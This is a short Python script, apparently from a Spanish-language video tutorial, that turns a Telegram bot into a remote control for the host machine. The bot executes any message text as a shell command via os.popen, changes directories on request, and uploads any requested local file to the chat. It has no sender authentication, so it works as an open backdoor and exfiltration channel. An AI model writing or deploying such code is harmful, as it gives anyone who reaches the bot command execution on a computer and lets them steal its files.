import os
import telebot

#iniciamos el bot


TOKEN = "" #Coloca tu Token Aqui
bot = telebot.TeleBot(TOKEN) # le pasamos el token

#vamos a crear un comando para saber el directorio actual
ruta_actual = os.getcwd()

#ahora la primera funcion para poder recibir una respuesta al escribir Start
@bot.message_handler(commands=['start'])  #aqui dice que va a realizar una accion cuando reciba start
def handle_start(message):
    bot.reply_to(message, f"Hola, Gracias por usar mi bot\n\nDirectorio actual: {ruta_actual}")
    
#vamos agregar algo para descargar un archivo del directorio actual y enviarlo a telegrsm    
    
@bot.message_handler(commands=['download'])
def handle_enviar_archivo(message):
    try:
        nombre_archivo = message.text.split(maxsplit=1)[1]
        archivo_ruta = os.path.join(ruta_actual, nombre_archivo)
        if os.path.isfile(archivo_ruta):
            with open(archivo_ruta, 'rb') as file:
                bot.send_document(message.chat.id, file)
            bot.reply_to(message, f"Archivo enviado: {nombre_archivo}")
        else:
            bot.reply_to(message, f"No se encontró el archivo: {nombre_archivo}")
    except IndexError:
        bot.reply_to(message, "Por favor, especifica el nombre del archivo después de /archivo.")




    
    #recibir comandos o lo que le escribas al bot
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global ruta_actual
    comando = message.text.strip() #aqui se almacena el valor y lo convertimos a texto
    print(comando)
    
    
    #esto es para manejar errores
    try:
        

        if comando.lower().startswith('cd'): #esto es para recibir el directorio. si escribimos cd lo que hace es 
                                            #que lo almacena , convierte en minusculas y lo divide en 2 partes, directorio anterior y directorio nuevo
            partes = comando.split(" ", 1)
            if len(partes) == 2:
                nuevo_directorio = partes[1].strip()
                os.chdir(nuevo_directorio)
                ruta_actual = os.getcwd()
                bot.reply_to(message, f"Directorio cambiado a: {ruta_actual}")
            else:
                bot.reply_to(message, "Por favor, especifica un directorio.")
        else:
            resultado = os.popen(comando).read()
            
            if resultado:
                bot.reply_to(message, f"Resultado del comando: {resultado}")
            else:
                bot.reply_to(message, f"Error o comando sin retorno de datos")
            
        
        
    
    except Exception as e:
        bot.reply_to(message, f"Error al ejecutar el comando: {e}")
        


#bien ahora lo adaptamos para que podamos usar comandos



bot.polling() #esto es para correr el bot

#pueden ir mejorandolo segun sus gustos. el codigo se los dejo debajo del video.
